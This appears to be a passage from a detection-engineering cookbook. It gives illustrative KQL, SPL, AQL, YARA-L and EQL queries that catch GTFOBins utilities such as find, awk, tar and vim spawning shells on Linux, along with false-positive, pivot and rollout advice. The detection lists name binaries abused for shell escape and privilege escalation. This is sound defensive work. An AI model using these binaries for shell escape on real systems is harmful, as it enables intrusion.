**[QUERY] KQL (Sentinel/Defender)** — Defender for Endpoint's Linux sensor, which flattens parent-process fields onto `DeviceProcessEvents`.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```kql
DeviceProcessEvents
| where FileName in ("sh","bash","dash")
| where InitiatingProcessFileName in ("find","awk","gawk","tar","vim","less","man","systemctl")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessCommandLine
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] SPL** — Sysmon for Linux or an EDR forwarder with a flattened parent-image field.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```spl
index=edr_linux EventCode=1
| search ParentImage IN ("*/find","*/awk","*/gawk","*/tar","*/vim","*/less","*/man","*/systemctl")
| search Image IN ("*/sh","*/bash","*/dash")
| table _time, host, User, ParentImage, ParentCommandLine, Image, CommandLine
```
Plausible expected result: unchanged. Interpretation: unchanged.

**[QUERY] AQL** — this is AQL, not standard SQL. Raw auditd `EXECVE` records carry only a bare `ppid` on the paired `SYSCALL` record, not a resolved parent process *name*; resolving that name requires joining against the parent's own earlier `EXECVE` record, which is the cross-event correlation this book's `N/A` §4.4 "multi-object deployment model" category names (a QRadar Reference Set/Building Block pair, DEH Part 27 §2–3) — not a single AQL statement. Rather than mark the whole language `N/A`, the search below still validates the LOLBin's own invocation, one step short of confirming the shell it spawned:

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```sql
SELECT DATEFORMAT(starttime,'YYYY-MM-dd HH:mm:ss') AS "Time", sourceip, username, UTF8(payload) AS "Command"
FROM events
WHERE LOGSOURCETYPENAME(devicetype) ILIKE '%Linux Audit%'
AND UTF8(payload) ILIKE '%type=EXECVE%'
AND (UTF8(payload) ILIKE '%"find"%' OR UTF8(payload) ILIKE '%"awk"%' OR UTF8(payload) ILIKE '%"tar"%')
LAST 24 HOURS
```
Plausible expected result: rows showing the GTFOBins utility's own `EXECVE` arguments, without a confirmed link to the child shell in this single query. Interpretation: a hit here justifies pulling the matching `ppid` chain by hand, or building the Reference Set join, before treating it as the full lineage claim this pattern otherwise makes.

**[QUERY] YARA-L** — Google SecOps UDM's `principal.process.parent_process` field, populated where the ingesting Linux EDR log source resolves it (raw, un-enriched auditd typically will not populate it).

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```yaral
rule gtfobins_lolbin_to_shell_lineage {
  meta:
    author = "author-agent"
  events:
    $proc.metadata.event_type = "PROCESS_LAUNCH"
    $proc.target.process.file.full_path = /\/(sh|bash|dash)$/ nocase
    $proc.principal.process.parent_process.file.full_path = /\/(find|awk|gawk|tar|vim|less|man|systemctl)$/ nocase
  condition:
    $proc
}
```
Plausible expected result: unchanged, contingent on the caveat above. Interpretation: unchanged.

**[QUERY] Elastic (EQL)** — this is the one covered surface that doesn't depend on a pre-flattened parent-name field: EQL's `sequence` ties the shell's launch to the LOLBin's own process by shared lineage, which is exactly the ordered multi-event shape DEH Appendix A5 §8's decision table routes to EQL rather than Elastic KQL.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use.
```eql
sequence by host.id
  [process where event.type == "start" and
    process.name in ("find","awk","gawk","tar","vim","less","man","systemctl")] by process.entity_id
  [process where event.type == "start" and
    process.name in ("sh","bash","dash")] by process.parent.entity_id
```
Plausible expected result: a two-event sequence hit joined on the shared entity ID, independent of whether the backend also happens to expose a flattened parent-name field. Interpretation: unchanged from the other implementations.

> **Blind Spot**
> A LOLBin-to-shell chain that runs inside a short-lived container destroyed before the host's log shipper flushes its buffer never reaches any of the six queries above — the process tree existed, but no record of it outlived the container. Environments running ephemeral CI runners or serverless-style container jobs need the shipper's flush interval measured against typical container lifetime, not an assumption that "if it ran, it logged."

**[FALSE POSITIVE]** The concrete driver: configuration-management tooling (Ansible via `sh -c`, Puppet, Salt) and monitoring agents (Nagios NRPE, Zabbix, Prometheus textfile collectors) fork a shell on every run or check interval, often every one to five minutes, and will dominate this result set on any fleet running them; `sudo systemctl edit` used legitimately by an admin to override a unit file is a second, smaller source. Fix: scope by the calling application's own service-account identity and known automation host inventory — do not loosen the parent-binary list to compensate, since that's the exact list the pattern depends on.

**[PIVOT]** Pull the resulting shell's own subsequent command history or argv to see what it actually ran, and check the parent binary's invoking user and session — if the parent binary ran under `sudo` or via a SUID-bit copy, that's the privilege-escalation half of this behavior (T1548.001) rather than plain command execution, and changes the escalation path this hit represents.

**[SOC MANAGEMENT]** This shape is cheap to run as a standing detection once the automation/monitoring allowlist above is built, but that allowlist takes real calendar time to stabilize against a live fleet. Run it as a scheduled hunt for two to four weeks against your own automation inventory before graduating it to an always-on alert — the first month of alerts on a fleet that automates anything will otherwise be entirely tuning work, not investigation.

## Cross-references

- Query-language syntax and backend semantics: DEH Parts 23–29 (Sigma, KQL, SPL, AQL, YARA-L, EQL/KQL/ES|QL) and DEH Appendix A5 §4 (aggregation ceilings) and §8 (Elastic surface decision table).
- Telemetry mechanics behind process-creation and command-line visibility: DEH Part 11 §3 (Living-off-the-land binaries: LOLBAS and GTFOBins), DEH Part 8 (Windows Detection Engineering), DEH Part 9 (Sysmon Detection Engineering).
- Detection Coverage / Quality / Debt scoring for graduating any pattern here into a standing rule: DEH Parts 41–43.
- Adjacent cookbook parts: Part 8 (Suspicious PowerShell Execution) for the scripting-host half of execution abuse this part excludes; Part 10 (Suspicious Scripting Hosts & Macro Execution) for the macro/WSH/HTA delivery chains that often hand off into `QC-09-02`'s mshta primitive; Part 22 (Malware Indicators) for generic unsigned-binary execution outside the named LOLBAS/GTFOBins catalogs; Part 27 (Multi-Behavior Hunt Chains) for a worked narrative stitching this part's patterns into a larger pivot sequence.
- Master navigation: Appendix A1 (Master Pattern Index), Appendix A3 (MITRE ATT&CK Cross-Reference).
